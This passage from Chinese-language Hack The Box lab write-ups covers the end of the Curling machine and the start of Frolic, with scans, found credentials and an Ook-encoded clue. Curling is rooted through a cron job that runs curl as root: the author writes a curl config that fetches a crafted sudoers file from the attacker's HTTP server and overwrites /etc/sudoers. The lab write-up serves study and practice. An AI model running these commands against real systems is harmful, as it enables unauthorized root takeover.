data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">\n                                        <span class=\"icon-cog\" aria-hidden=\"true\"></span>\n                                        <span class=\"caret\" aria-hidden=\"true\"></span>\n                                </button>\n                                                                <ul class=\"dropdown-menu\" aria-labelledby=\"dropdownMenuButton-3\">\n                                                                                        <li class=\"print-icon\"> <a href=\"/index.php/2-uncategorised/3-what-s-the-object-of-curling?tmpl=component&print=1\" title=\"Print article < What's the object of curling? >\" onclick=\"window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;\" rel=\"nofollow\">                 <span class=\"icon-print\" aria-hidden=\"true\"></span>\n                Print   </a> </li>\n                                                                                                                                                        </ul>\n                        </div>\n\n        </div>\n\n                        <dl class=\"article-info muted\">\n\n                        <dt class=\"article-info-term\">\n                                                                        Details                                                 </dt>\n\n                                                        <dd class=\"createdby\" itemprop=\"author\" itemscope itemtype=\"https://schema.org/Person\">\n                                        Written by <span itemprop=\"name\">Super User</span>      </dd>\n\n                                                                                <dd class=\"category-name\">\n                                                                                                                                                Category: <a href=\"/index.php/2-uncategorised\" itemprop=\"genre\">Uncategorised</a>                                                  </dd>\n\n                                                                                <dd class=\"published\">\n                                <span class=\"icon-calendar\" aria-hidden=\"true\"></span>\n                                <time datetime=\"2018-05-22T18:54:21+00:00\" itemprop=\"datePublished\">\n                                        Published: 22 May 2018                          </time>\n                        </dd>\n\n                                                                                <dd class=\"hits\">\n                                        <span class=\"icon-eye-open\" aria-hidden=\"true\"></span>\n                                        <meta itemprop=\"interactionCount\" content=\"UserPageVisits:5\" />\n                                        Hits: 5                 </dd>                                           </dl>\n\n<p>Good question. First, let's get a bit of the jargon down. The playing surface in curling is called \"the sheet.\" Sheet dimensions can vary, but they're usually around 150 feet long by about 15 feet wide. The sheet is covered with tiny droplets of water that become ice and cause the stones to \"curl,\" or deviate from a straight path. These water droplets are known as \"pebble.\"</p>\n\n                </div>\n                        </div>\n\n                <div class=\"items-row cols-3 row-0 row-fluid\">\n                                        <div class=\"item column-1 span4\"\n                                itemprop=\"blogPost\" itemscope itemtype=\"https://schema.org/BlogPosting\">\n\n        <h2 class=\"item-title\" itemprop=\"headline\">\n                        <a href=\"/index.php/2-uncategorised/2-curling-you-know-its-true\" itemprop=\"url\">\n                        Curling you know its true!              </a>\n                </h2>\n\n<div class=\"icons\">\n\n                                        <div class=\"btn-group pull-right\">\n                                <button class=\"btn dropdown-toggle\" type=\"button\" id=\"dropdownMenuButton-2\" aria-label=\"User tools\"\n                                data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">\n                                        <span class=\"icon-cog\" aria-hidden=\"true\"></span>\n                                        <span class=\"caret\" aria-hidden=\"true\"></span>\n                                </button>\n                                                                <ul class=\"dropdown-menu\" aria-labelledby=\"dropdownMenuButton-2\">\n                                                                                        <li class=\"print-icon\"> <a href=\"/index.php/2-uncategorised/2-curling-you-know-its-true?tmpl=component&print=1\" title=\"Print article < Curling you know its true! >\" onclick=\"window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;\" rel=\"nofollow\">                    <span class=\"icon-print\" aria-hidden=\"true\"></span>\n                Print   </a> </li>\n                                                                                                                                                        </ul>\n                        </div>\n\n        </div>\n\n                        <dl class=\"article-info muted\">\n\n                        <dt class=\"article-info-term\">\n                                                                        Details                                                 </dt>\n\n                                                        <dd class=\"createdby\" itemprop=\"author\" itemscope itemtype=\"https://schema.org/Person\">\n                                        Written by <span itemprop=\"name\">Super User</span>      </dd>\n\n                                                                                <dd class=\"category-name\">\n                                                                                                                                                Category: <a href=\"/index.php/2-uncategorised\" itemprop=\"genre\">Uncategorised</a>                                                  </dd>\n\n                                                                                <dd class=\"published\">\n                                <span class=\"icon-calendar\" aria-hidden=\"true\"></span>\n                                <time datetime=\"2018-05-22T18:53:17+00:00\" itemprop=\"datePublished\">\n                                        Published: 22 May 2018                          </time>\n                        </dd>\n\n                                                                                <dd class=\"hits\">\n                                        <span class=\"icon-eye-open\" aria-hidden=\"true\"></span>\n                                        <meta itemprop=\"interactionCount\" content=\"UserPageVisits:4\" />\n                                        Hits: 4                 </dd>                                           </dl>\n\n<p>Curling is absolutely the best sport to watch on television, particularly for viewers looking for an escape from the frantic \"more, faster, bigger, higher\" grind of most televised games. Watching basketball or hockey can get you so hyped up, you feel like drinking a Red Bull and doing jumping jacks. Watching curling makes you want to drink a glass of red wine and lie down on the shag carpet. Curling is deliberate. Thoughtful, even. The games move very slowly. The players spend a lot of time talking strategy. There are nods and quiet words of encouragement; rarely are there disagreements. When it comes time for a team member to play their turn by sliding a stone down the ice, the moves are elegant. There's a wind up, a push-off, a slide, and a gentle release. Such poise and finesse!</p>\n\n                        </div>\n\n                                        <div class=\"item column-2 span4\"\n                                itemprop=\"blogPost\" itemscope itemtype=\"https://schema.org/BlogPosting\">\n\n        <h2 class=\"item-title\" itemprop=\"headline\">\n                        <a href=\"/index.php/2-uncategorised/1-first-post-of-curling2018\" itemprop=\"url\">\n                        My first post of curling in 2018!               </a>\n                </h2>\n\n<div class=\"icons\">\n\n                                        <div class=\"btn-group pull-right\">\n                                <button class=\"btn dropdown-toggle\" type=\"button\" id=\"dropdownMenuButton-1\" aria-label=\"User tools\"\n                                data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">\n                                        <span class=\"icon-cog\" aria-hidden=\"true\"></span>\n                                        <span class=\"caret\" aria-hidden=\"true\"></span>\n                                </button>\n                                                                <ul class=\"dropdown-menu\" aria-labelledby=\"dropdownMenuButton-1\">\n                                                                                        <li class=\"print-icon\"> <a href=\"/index.php/2-uncategorised/1-first-post-of-curling2018?tmpl=component&print=1\" title=\"Print article < My first post of curling in 2018! >\" onclick=\"window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;\" rel=\"nofollow\">                     <span class=\"icon-print\" aria-hidden=\"true\"></span>\n                Print   </a> </li>\n                                                                                                                                                        </ul>\n                        </div>\n\n        </div>\n\n                        <dl class=\"article-info muted\">\n\n                        <dt class=\"article-info-term\">\n                                                                        Details                                                 </dt>\n\n                                                        <dd class=\"createdby\" itemprop=\"author\" itemscope itemtype=\"https://schema.org/Person\">\n                                        Written by <span itemprop=\"name\">Super User</span>      </dd>\n\n                                                                                <dd class=\"category-name\">\n                                                                                                                                                Category: <a href=\"/index.php/2-uncategorised\" itemprop=\"genre\">Uncategorised</a>                                                  </dd>\n\n                                                                                <dd class=\"published\">\n                                <span class=\"icon-calendar\" aria-hidden=\"true\"></span>\n                                <time datetime=\"2018-05-22T18:51:53+00:00\" itemprop=\"datePublished\">\n                                        Published: 22 May 2018                          </time>\n                        </dd>\n\n                                                                                <dd class=\"hits\">\n                                        <span class=\"icon-eye-open\" aria-hidden=\"true\"></span>\n                                        <meta itemprop=\"interactionCount\" content=\"UserPageVisits:4\" />\n                                        Hits: 4                 </dd>                                           </dl>\n\n<p>Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!</p>\n<p>- Floris</p>\n\n                        </div>\n\n                </div>\n\n</div>\n\n                                        <div class=\"clearfix\"></div>\n\n<ul itemscope itemtype=\"https://schema.org/BreadcrumbList\" class=\"breadcrumb\">\n                        <li>\n                        You are here: Â \n                </li>\n\n                                <li itemprop=\"itemListElement\" itemscope itemtype=\"https://schema.org/ListItem\" class=\"active\">\n                                <span itemprop=\"name\">\n                                        Home                            </span>\n                                <meta itemprop=\"position\" content=\"1\">\n                        </li>\n                </ul>\n\n                                        <!-- End Content -->\n                                </main>\n                                                                        <div id=\"aside\" class=\"span3\">\n                                                <!-- Begin Right Sidebar -->\n                                                <div class=\"well _menu\"><h3 class=\"page-header\">Main Menu</h3><ul class=\"nav menu\">\n<li class=\"item-101 default current active\"><a href=\"/index.php\" >Home</a></li></ul>\n</div><div class=\"well \"><h3 class=\"page-header\">Login Form</h3><form action=\"/index.php\" method=\"post\" id=\"login-form\" class=\"form-inline\">\n                <div class=\"userdata\">\n                <div id=\"form-login-username\" class=\"control-group\">\n                        <div class=\"controls\">\n                                                                        <div class=\"input-prepend\">\n                                                <span class=\"add-on\">\n                                                        <span class=\"icon-user hasTooltip\" title=\"Username\"></span>\n                                                        <label for=\"modlgn-username\" class=\"element-invisible\">Username</label>\n                                                </span>\n                                                <input id=\"modlgn-username\" type=\"text\" name=\"username\" class=\"input-small\" tabindex=\"0\" size=\"18\" placeholder=\"Username\" />\n                                        </div>\n                                                        </div>\n                </div>\n                <div id=\"form-login-password\" class=\"control-group\">\n                        <div class=\"controls\">\n                                                                        <div class=\"input-prepend\">\n                                                <span class=\"add-on\">\n                                                        <span class=\"icon-lock hasTooltip\" title=\"Password\">\n                                                        </span>\n                                                                <label for=\"modlgn-passwd\" class=\"element-invisible\">Password                                                   </label>\n                                                </span>\n                                                <input id=\"modlgn-passwd\" type=\"password\" name=\"password\" class=\"input-small\" tabindex=\"0\" size=\"18\" placeholder=\"Password\" />\n                                        </div>\n                                                        </div>\n                </div>\n                                                <div id=\"form-login-remember\" class=\"control-group checkbox\">\n                        <label for=\"modlgn-remember\" class=\"control-label\">Remember Me</label> <input id=\"modlgn-remember\" type=\"checkbox\" name=\"remember\" class=\"inputbox\" value=\"yes\"/>\n                </div>\n                                <div id=\"form-login-submit\" class=\"control-group\">\n                        <div class=\"controls\">\n                                <button type=\"submit\" tabindex=\"0\" name=\"Submit\" class=\"btn btn-primary login-button\">Log in</button>\n                        </div>\n                </div>\n                                        <ul class=\"unstyled\">\n                                                        <li>\n                                        <a href=\"/index.php/component/users/?view=remind&Itemid=101\">\n                                        Forgot your username?</a>\n                                </li>\n                                <li>\n                                        <a href=\"/index.php/component/users/?view=reset&Itemid=101\">\n                                        Forgot your password?</a>\n                                </li>\n                        </ul>\n                <input type=\"hidden\" name=\"option\" value=\"com_users\" />\n                <input type=\"hidden\" name=\"task\" value=\"user.login\" />\n                <input type=\"hidden\" name=\"return\" value=\"aHR0cDovLzEyNy4wLjAuMS8=\" />\n                <input type=\"hidden\" name=\"e6b8a82d84a03e7e05d6452f52f975f7\" value=\"1\" />       </div>\n        </form>\n</div>\n                                                <!-- End Right Sidebar -->\n                                        </div>\n                                                        </div>\n                </div>\n        </div>\n        <!-- Footer -->\n        <footer class=\"footer\" role=\"contentinfo\">\n                <div class=\"container\">\n                        <hr />\n\n                        <p class=\"pull-right\">\n                                <a href=\"#top\" id=\"back-top\">\n                                        Back to Top                             </a>\n                        </p>\n                        <p>\n                                Â© 2022 Cewl Curling site!                  </p>\n                </div>\n        </footer>\n\n</body>\n      <!-- secret.txt -->\n</html>\n```\næœ‰ç‚¹æ²¡æ˜ç™½è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯ input æç¤ºæœ¬åœ° URL åœ°å€ï¼Œæˆ‘ä»¬è¿˜æ˜¯å»è¯·æ±‚ä¸€ä¸‹è¯•è¯•å§\n\n```bash\ncurl http://127.0.0.1\n```\nç„¶åè¿”å›çš„æ˜¯ report çš„å†…å®¹ï¼Œä¹Ÿæ˜¯é¦–é¡µçš„å†…å®¹\n\n```bash\nfloris@curling:~/admin-area$ ls -la\ntotal 28\ndrwxr-x--- 2 root   floris  4096 May 22  2018 .\ndrwxr-xr-x 6 floris floris  4096 May 22  2018 ..\n-rw-rw---- 1 root   floris    25 Apr 28 06:55 input\n-rw-rw---- 1 root   floris 14236 Apr 28 06:55 report\n```\n```bash\nfloris@curling:~/admin-area$ ls -la\ntotal 28\ndrwxr-x--- 2 root   floris  4096 May 22  2018 .\ndrwxr-xr-x 6 floris floris  4096 May 22  2018 ..\n-rw-rw---- 1 root   floris    25 Apr 28 07:02 input\n-rw-rw---- 1 root   floris 14236 Apr 28 07:02 report\n```\nå¯¹æ¯”ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸€ç›´åœ¨è¢«åˆ·æ–°æˆ–è€…è¯´å†™å…¥å†…å®¹\n\nè¿è¡Œä¸€ä¸‹ pspy64 çœ‹çœ‹\n\n```bash\n2022/04/28 07:16:01 CMD: UID=0    PID=16262  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report \n2022/04/28 07:16:01 CMD: UID=0    PID=16261  | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input \n2022/04/28 07:16:01 CMD: UID=0    PID=16260  | /usr/sbin/CRON -f \n2022/04/28 07:16:01 CMD: UID=0    PID=16259  | /usr/sbin/CRON -f \n2022/04/28 07:16:01 CMD: UID=0    PID=16264  | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report \n2022/04/28 07:16:13 CMD: UID=0    PID=16266  | \n2022/04/28 07:17:01 CMD: UID=0    PID=16274  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report \n2022/04/28 07:17:01 CMD: UID=0    PID=16272  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report\n```\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ª curl æ¯éš”å‡ ç§’å°±ä¼šè¿è¡Œä¸€ä¸‹ï¼Œé‚£å’±ä»¬æ˜¯å¯ä»¥åœ¨ /home/floris/admin-area/input ä¸­å†™å…¥æ¶æ„å†…å®¹ï¼Œä»¥ Getshell\n\nåœ¨æœ¬åœ°æ„é€ ä¸€ä¸ªæ¶æ„ exploit æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[/opt/tools]\nâ””â”€# cat exploit                       \nroot    ALL=(ALL:ALL) ALL\nfloris  ALL=(ALL:ALL) ALL\n```\nç„¶åä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡å™¨\n\n```bash\npython3 -m http.server 80\n```\næ¥ç€åœ¨é¶æœºä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤\n\n```bash\necho -e 'url = \"http://10.10.16.12/exploit\"\\noutput = \"/etc/sudoers\"' > input\n```\nç„¶åç­‰ç€å°±è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[/opt/tools]\nâ””â”€# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.10.150 - - [28/Apr/2022 03:23:03] \"GET /exploit HTTP/1.1\" 200 -\n```\nç­‰æˆ‘ä»¬è¿™è¾¹çš„ HTTP æœåŠ¡å‡ºç°è¯·æ±‚ä»¥åï¼Œå°±æ˜¯ä¿®æ”¹æˆåŠŸäº†\n\næ¥ç€ä½¿ç”¨ sudo su åˆ‡æ¢åˆ° root ç”¨æˆ·ï¼Œå¯†ç è¿˜æ˜¯ floris ç”¨æˆ·çš„å¯†ç \n\n```bash\nfloris@curling:~/admin-area$ sudo su\n[sudo] password for floris: \nroot@curling:/home/floris/admin-area# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nroot@curling:/home/floris/admin-area# cat /root/root.txt\n82c198ab6fc5365fdc6da2ee5c26064a\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Frolic - Hackthebox","url":"/2022/04/27/Hackthebox/Easy/Hackthebox-Frolic/","content":"\n# Hackthebox - Frolic\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Frolic/15bf4abf-f6b0-412a-ba23-dad74aff6b53.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Frolic/c129ddea-5e6c-40e7-a63c-68436fb3f2ae.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.111\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-25 21:22 EDT\nNmap scan report for 10.10.10.111\nHost is up (0.32s latency).\nNot shown: 65530 closed ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)\n|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)\n|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n1880/tcp open  http        Node.js (Express middleware)\n|_http-title: Node-RED\n9999/tcp open  http        nginx 1.10.3 (Ubuntu)\n|_http-server-header: nginx/1.10.3 (Ubuntu)\n|_http-title: Welcome to nginx!\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/25%OT=22%CT=1%CU=38693%PV=Y%DS=2%DC=T%G=Y%TM=626749B\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ\nOS:(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W2=\nOS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s\n|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: frolic\n|   NetBIOS computer name: FROLIC\\x00\n|   Domain name: \\x00\n|   FQDN: frolic\n|_  System time: 2022-04-26T06:53:50+05:30\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2022-04-26T01:23:52\n|_  start_date: N/A\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   323.74 ms 10.10.14.1\n2   318.95 ms 10.10.10.111\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.58 seconds\n```\n## Http\n### 1880\n![](Hackthebox-Frolic/114015ca-97a4-4bf8-aa0e-2aeb1cdc21d0.png)\n\nå°è¯•äº†ä¸€ä¸‹ï¼Œadmin/admin ä¼šç™»å½•å¤±è´¥ï¼Œä½† admin/password ä¼šæç¤ºè¶…æ—¶ï¼Œæœ‰ç‚¹å¥‡æ€ªï¼Œfuzz äº†ä¸€ä¸‹æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå…ˆæ”¾ç€\n\n### 9999\n![](Hackthebox-Frolic/dd8854d8-4551-4982-a672-63d404c4a92f.png)\n\n## Smb\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# smbmap -H 10.10.10.111                                              \n[+] Guest session       IP: 10.10.10.111:445    Name: 10.10.10.111                                      \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        IPC$                                                    NO ACCESS       IPC Service (frolic server (Samba, Ubuntu))\n```\nsmb æ‰«äº†ä¸€ä¸‹ï¼Œä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿\n\n## Fuzz\n### 1880\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.10.111:1880/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.111:1880/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/25 21:56:22 Starting gobuster in directory enumeration mode\n===============================================================\n/icons                (Status: 401) [Size: 12]\n/red                  (Status: 301) [Size: 173] [--> /red/]\n/vendor               (Status: 301) [Size: 179] [--> /vendor/]\n/settings             (Status: 401) [Size: 12]                \n/Icons                (Status: 401) [Size: 12]                \n/nodes                (Status: 401) [Size: 12]                \n/SETTINGS             (Status: 401) [Size: 12]                \n/flows                (Status: 401) [Size: 12]                \n/ICONS                (Status: 401) [Size: 12]                \n\n===============================================================\n2022/04/25 22:03:47 Finished\n===============================================================\n```\nfuzz äº†ä¸€ä¸‹ï¼Œæ²¡ä¸œè¥¿ï¼Œç»§ç»­æ”¾ç€å§\n\n### 9999\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.111:9999/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/25 21:52:59 Starting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]\n/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/] \n/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]  \n/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]\n/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]  \n\n===============================================================\n2022/04/25 22:00:19 Finished\n===============================================================\n```\næˆ‘æ„Ÿè§‰çªç ´å£å°±åœ¨è¿™è¾¹äº†\n\n![](Hackthebox-Frolic/94b7e198-05c8-43d9-ac74-d5285f5baac2.png)\n\nadmin ç›®å½•æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå…ˆçœ‹çœ‹å…¶ä»–çš„\n\n![](Hackthebox-Frolic/4d13dbba-a3cf-4781-894a-9043cb9cd782.png)\n\ntest ç›®å½•æ˜¯ä¸€ä¸ª phpinfo æœ‰ç‚¹æ„æ€\n\n![](Hackthebox-Frolic/31decdeb-4271-4830-a62d-c05046668c95.png)\n\nbackup é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ªç›®å½•ï¼Œçœ‹ç€åƒæ˜¯è´¦å·å¯†ç \n\n```bash\nusername = admin\npassword = imnothuman\n```\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç ï¼Œé‚£ä¸ªç›®å½• 403 è¿›ä¸å»\n\nå’±ä»¬å»ç™»å½•ä¸€ä¸‹çœ‹çœ‹\n\n![](Hackthebox-Frolic/d64e0214-8cce-4c33-81d7-d3b9840e1e42.png)\n\nè¿™è¾¹æç¤ºç™»å½•å¤±è´¥ï¼Œé‚£ä¼šä¸ä¼šæ˜¯åœ¨ 1880 ç™»å½•å‘¢ï¼Ÿ\n\n![](Hackthebox-Frolic/bc154a9d-4387-445a-9732-d453239687fd.png)\n\nä¹Ÿç™»å½•å¤±è´¥ï¼Œæœ‰ç‚¹å¥‡æ€ª\n\n> [http://10.10.10.111:9999/admin/js/login.js](http://10.10.10.111:9999/admin/js/login.js)\n\n```bash\nvar attempt = 3; // Variable to count number of attempts.\n// Below function Executes on click of login button.\nfunction validate(){\nvar username = document.getElementById(\"username\").value;\nvar password = document.getElementById(\"password\").value;\nif ( username == \"admin\" && password == \"superduperlooperpassword_lol\"){\nalert (\"Login successfully\");\nwindow.location = \"success.html\"; // Redirecting to other page.\nreturn false;\n}\nelse{\nattempt --;// Decrementing by one.\nalert(\"You have left \"+attempt+\" attempt;\");\n// Disabling fields after 3 attempts.\nif( attempt == 0){\ndocument.getElementById(\"username\").disabled = true;\ndocument.getElementById(\"password\").disabled = true;\ndocument.getElementById(\"submit\").disabled = true;\nreturn false;\n}\n}\n}\n```\næŸ¥çœ‹æºä»£ç çš„æ—¶å€™æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå•Šè¿™ï¼Ÿ\n\n```bash\nusername = admin\npassword = superduperlooperpassword_lol\n```\n# æ¼æ´åˆ©ç”¨\n> [http://10.10.10.111:9999/admin/success.html](http://10.10.10.111:9999/admin/success.html)\n\n```bash\n..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.\n```\nç™»å½•åè¿›å…¥äº†è¿™ä¸ªé¡µé¢ï¼Œæ‹¿åˆ°äº†ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦ï¼Œåƒæ˜¯æŸç§åŠ å¯†ï¼Œå°è¯•è§£å¯†ä¸€ä¸‹çœ‹çœ‹\n\næˆ‘æœäº†ä¸€ä¸‹èµ„æ–™ï¼Œè¿™ä¸ªç¼–ç¨‹è¯­è¨€å«åš Okkï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªè¿™ç§è¯­è¨€çš„è§£å¯†ç½‘ç«™\n\n> [https://esolangs.org/wiki/ook](https://esolangs.org/wiki/ook)!\n\n> [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language)\n\n```bash\nNothing here check /asdiSIAJJ0QWE9JAS\n```\nç»§ç»­å»è®¿é—®ä¸€ä¸‹\n\n> [http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/](http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/)\n\n```bash\nUEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs 